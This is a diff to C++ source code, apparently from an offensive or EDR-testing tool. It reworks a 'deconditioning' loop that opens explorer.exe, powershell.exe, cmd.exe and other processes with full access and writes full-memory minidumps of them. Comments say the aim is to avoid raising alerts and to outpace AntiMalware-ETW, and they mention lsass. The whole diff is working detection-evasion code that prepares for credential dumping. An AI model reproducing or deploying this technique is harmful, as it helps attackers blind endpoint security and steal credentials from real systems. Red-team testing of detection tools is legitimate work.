@@ -243,37 +243,46 @@ int main(int argc, char** argv) {
     };
     */
 
-    constexpr int maxDumps = 100;
-    int repetitions = 10;
-    int explorerPID = 0;
-    for (int n = 0; n < repetitions; n++) {
+    msg << "Starting deconditioning";
+    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
 
-        msg << "Starting deconditioning round " << n;
-        print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
-
-        int i = 0;
+    constexpr int dumps = 20;
+    std::vector<std::wstring> procsDump = {
+        L"explorer.exe", L"powershell.exe", L"cmd.exe", L"ShellHost.exe", L"audiodg.exe"
+    };
+    int i = 0;
+    while (i < dumps) { // repeat until target number reached
+        int prev = i;
         if (Process32First(snap, &pe)) {
             do {
-                if (pe.th32ProcessID == explorerPID || _wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
-                    explorerPID = pe.th32ProcessID; // strcmp only the first run
+                // only dump "non important" procs, do not raise alerts here
+                if (std::find(procsDump.begin(), procsDump.end(), pe.szExeFile) != procsDump.end()) {
+
                     HANDLE hDecon = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
                     if (hDecon == NULL) {
                         continue; // ignore errors, just open+dump as many procs as possible (except lsass)
                     }
+                    msg << "Dumping " << pe.th32ProcessID;
+                    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
+
                     // blindly dump and overwrite
-                    std::cout << "dumping " << pe.th32ProcessID << "\n";
                     MiniDWriteD(hDecon, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
                     // and close proc handle again
                     CloseHandle(hDecon);
                     i++;
                 }
-            } while (Process32Next(snap, &pe) && i < maxDumps);
+            } while (Process32Next(snap, &pe) && i < dumps);
         }
-
-        msg << "Finished deconditioning round " << n << ", dumped " << i << " procs";
-        print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
-        Sleep(sleep_between_steps_ms * 3); // poor AntiMalware-ETW is too slow to keep up
+        if (i == prev) {
+            msg << "Unable to dump any proc";
+            print_and_emit_event(msg.str(), fail); msg.str({}); msg.clear();
+            break; // unable to dump any proc, break
+        }
     }
+
+    msg << "Finished deconditioning, dumped " << i << " procs";
+    print_and_emit_event(msg.str(), ok); msg.str({}); msg.clear();
+    Sleep(sleep_between_steps_ms * 3); // poor AntiMalware-ETW is too slow to keep up
 #endif
 
     // init strings
